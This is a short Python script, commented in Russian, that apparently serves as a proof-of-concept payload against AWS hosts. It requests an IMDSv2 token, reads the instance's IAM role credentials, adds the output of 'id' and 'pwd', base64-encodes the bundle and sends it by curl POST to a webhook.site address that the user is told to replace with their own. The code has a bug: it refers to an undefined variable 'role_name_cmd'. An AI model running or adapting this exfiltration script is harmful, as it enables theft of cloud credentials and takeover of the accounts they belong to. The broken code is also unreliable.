import subprocess
import json
import base64

def get_iam_and_send():
    # 1. Получаем токен AWS (IMDSv2)
    token_cmd = "curl -s -f -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600'"
    token = subprocess.getoutput(token_cmd).strip()
    
    # 2. Проверяем роль и креды
    if token and len(token) > 30:
        role_cmd = f"curl -s -f -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        role_name = subprocess.getoutput(role_name_cmd).strip()
        
        creds_cmd = f"curl -s -f -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        iam_data = subprocess.getoutput(creds_cmd)
    else:
        iam_data = "AWS_IMDS_BLOCKED"

    # 3. Собираем финальный пакет
    final_payload = {
        "status": "FINAL_INFRA_PROOF",
        "iam_creds": iam_data,
        "root": subprocess.getoutput("id"),
        "path": subprocess.getoutput("pwd")
    }
    
    # 4. ОТПРАВКА ЧЕРЕЗ CURL (самый важный момент)
    # Кодируем в base64, чтобы спецсимволы не сломали команду
    b64_data = base64.b64encode(json.dumps(final_payload).encode()).decode()
    
    # ЗАМЕНИ URL НА СВОЙ WEBHOOK
    webhook_url = "https://webhook.site/ТВОЙ_ID" 
    
    send_cmd = f"curl -X POST -d '{b64_data}' {webhook_url}"
    subprocess.call(send_cmd, shell=True)

get_iam_and_send()